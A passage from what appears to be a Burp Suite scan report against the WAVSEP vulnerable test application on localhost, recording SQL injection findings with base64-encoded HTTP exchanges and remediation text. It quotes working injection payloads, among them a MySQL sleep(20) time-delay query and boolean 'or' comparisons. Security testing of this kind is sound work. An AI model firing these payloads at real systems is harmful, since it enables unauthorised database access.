ZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2dpZD0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSk=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ3OjEzIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOSAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGFuIHVwZGF0ZSBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpRdWVyeSBleGVjdXRlZAoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7536439056749794304</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithErrors.jsp [orderby parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>orderby</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the orderby parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the orderby parameter. The application took <b>20004</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTAtSW5qZWN0aW9uSW5TZWFyY2hPcmRlckJ5LU51bWVyaWMtQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogOQ0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtNTAwRXJyb3IvQ2FzZTEwLUluamVjdGlvbkluU2VhcmNoT3JkZXJCeS1OdW1lcmljLUJpbmFyeURlbGliZXJhdGVSdW50aW1lRXJyb3ItV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm9yZGVyYnk9MSc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwMw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0Njo1MyBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTsmIzM5OyBhdCBsaW5lIDE8L3A+PHA+PGI+RGVzY3JpcHRpb248L2I+IFRoZSBzZXJ2ZXIgZW5jb3VudGVyZWQgYW4gdW5leHBlY3RlZCBjb25kaXRpb24gdGhhdCBwcmV2ZW50ZWQgaXQgZnJvbSBmdWxmaWxsaW5nIHRoZSByZXF1ZXN0LjwvcD48aHIgY2xhc3M9ImxpbmUiIC8+PGgzPkFwYWNoZSBUb21jYXQvOC41Ljg0PC9oMz48L2JvZHk+PC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTAtSW5qZWN0aW9uSW5TZWFyY2hPcmRlckJ5LU51bWVyaWMtQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogOQ0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtNTAwRXJyb3IvQ2FzZTEwLUluamVjdGlvbkluU2VhcmNoT3JkZXJCeS1OdW1lcmljLUJpbmFyeURlbGliZXJhdGVSdW50aW1lRXJyb3ItV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm9yZGVyYnk9KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEp]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ3OjE0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3MzANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEwIC0gSW5qZWN0aW9uIGludG8gYW4gb3JkZXIgYnkgY2xhdXNlIChudW1lcmljKSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEKPC9URD4KPFREPgpXZWxjb21lIHRvIHRoZSB3ZWIgc2l0ZQo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoyCjwvVEQ+CjxURD4KUmVtZW1iZXIgdG8gY2hhbmdlIHlvdXIgcGFzc3dvcmQKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMwo8L1REPgo8VEQ+CllvdXIgYWNjb3VudCBpcyBhYm91dCB0byBleHBpcmUKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4867880082089613312</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithErrors.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>44047937 or 9180=09180</b> and <b>79061489 or 8086=8095</b> were each submitted in the transactionDate parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionDate parameter. The application took <b>20007</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTUtSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZVdpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGhFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNg0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtNTAwRXJyb3IvQ2FzZTE1LUluamVjdGlvbkluU2VhcmNoLURhdGVXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KdHJhbnNhY3Rpb25EYXRlPTIwMTAtMDEtMDE0NDA0NzkzNyUyMG9yJTIwOTE4MCUzZDA5MTgw]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ5OjMyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAxMjYyDQoNCgoKCjwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgSFRNTCA0LjAxIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi9odG1sNC9sb29zZS5kdGQiPgo8aHRtbD4KPGhlYWQ+CjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PUlTTy04ODU5LTEiPgo8dGl0bGU+Q2FzZSAxNSAtIEluamVjdGlvbiBpbnRvIGRhdGUgdmFsdWVzICh3aXRob3V0IHF1b3RlcykgaW4gYW4gdXBkYXRlIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEzMgo8L1REPgo8VEQ+CjEwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoxMzMKPC9URD4KPFREPgoxMjAwCjwvVEQ+CjxURD4KU2ltcGxlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8VFI+CjxURD4KMTM1CjwvVEQ+CjxURD4KMzAwMAo8L1REPgo8VEQ+ClNpbXBsZSBUcmFuc2FjdGlvbgo8L1REPgo8VEQ+CjIwMTAtMDEtMDEKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjIyMwo8L1REPgo8VEQ+CjQwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgo0MjMKPC9URD4KPFREPgo1MDAwCjwvVEQ+CjxURD4KU2ltcGxlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8VFI+CjxURD4KNDU2CjwvVEQ+CjxURD4KNjAwMAo8L1REPgo8VEQ+ClNpbXBsZSBUcmFuc2FjdGlvbgo8L1REPgo8VEQ+CjIwMTAtMDEtMDEKPC9URD4KPC9UUj4KPFRSPgo8VEQ+Cjc4OQo8L1REPgo8VEQ+CjcwMTIKPC9URD4KPFREPgpFeHBlbnNpdmUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgo4OTUKPC9URD4KPFREPgo4MDAwCjwvVEQ+CjxURD4KSGVsbG8gV29ybGQKPC9URD4KPFREPgoyMDEwLTAyLTAyCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTUtSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZVdpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGhFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNg0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtNTAwRXJyb3IvQ2FzZTE1LUluamVjdGlvbkluU2VhcmNoLURhdGVXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KdHJhbnNhY3Rpb25EYXRlPTIwMTAtMDEtMDE3OTA2MTQ4OSUyMG9yJTIwODA4NiUzZDgwOTU=]]></request>
